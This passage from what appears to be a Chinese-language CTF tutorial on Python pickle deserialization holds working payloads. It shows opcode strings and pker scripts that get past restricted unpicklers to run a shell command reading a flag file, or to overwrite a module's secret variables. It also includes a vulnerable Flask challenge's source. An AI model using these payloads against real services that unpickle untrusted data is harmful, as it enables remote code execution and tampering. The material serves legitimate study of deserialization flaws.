&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">__dict__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__dict__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">gtat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__getattribute__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">gtat&lt;/span>
&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">__builtins__&lt;/span>
&lt;span style="color:#111">builtin_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">builtin_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.sys.modules[&amp;#39;&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#d88200">&amp;#39;].system(&amp;#39;&lt;/span>&lt;span style="color:#111">cat&lt;/span> &lt;span style="color:#f92672">../&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
&lt;/code>&lt;/pre>&lt;/details>
&lt;h3 id="禁止br操作码">禁止&lt;code>b'R'&lt;/code>操作码&lt;/h3>
&lt;p>也就相当于不可以用&lt;code>__reduce__&lt;/code>，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用&lt;code>b'i'&lt;/code>，&lt;code>b'i'&lt;/code>，&lt;code>b'b'&lt;/code>这些操作码来rce。&lt;/p>
&lt;h3 id="--变量覆盖">&amp;ndash;&amp;raquo;变量覆盖&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子7 - [高校战“疫”网络安全分享赛2020] webtmp
&lt;/h4>
&lt;/summary>
&lt;p>（这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了&lt;code>R&lt;/code>操作码，同时重写&lt;code>find_class()&lt;/code>限制引入模块为&lt;code>__main__&lt;/code>，两个考点）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">secret&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">mimetype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;text/plain&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;No... I don&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t like R-things. No Rabits, Rats, Roosters or RCEs.&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Are you sure that is an animal???&amp;#39;&lt;/span>
&lt;span style="color:#111">correct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_result.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">giveflag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">correct&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something wrong&amp;#34;&lt;/span>
&lt;span style="color:#111">sample_obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;一给我哩giaogiao&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Giao&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_page.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>看源码，opcode部分ban掉了&lt;code>R&lt;/code>操作码（调用一个callable对象），不能用&lt;code>__reduce__&lt;/code>了；也重写了&lt;code>find_class()&lt;/code>，module必须是&lt;code>__main__&lt;/code>；我们的目标是&lt;/p>
&lt;p>&lt;code>restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)&lt;/code>为真，即correct==True&lt;/p>
&lt;p>这里我们通过加载&lt;code>__main__.secret&lt;/code>可以引入secret模块，来把&lt;code>secret.name&lt;/code>和&lt;code>secret.category&lt;/code>这两个变量覆盖为任意字符串，再以这个字符串为参数构造Animal对象（栈顶对于type的检查）&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;span style="color:#75715e"># b&amp;#34;c__main__\nsecret\np0\n0g0\n(}(S&amp;#39;name&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtbg0\n(}(S&amp;#39;category&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtb(S&amp;#39;frieggs&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ni__main__\nAnimal\np3\n0g3\n.&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者构造的exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;y&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.&amp;#39;&lt;/span>
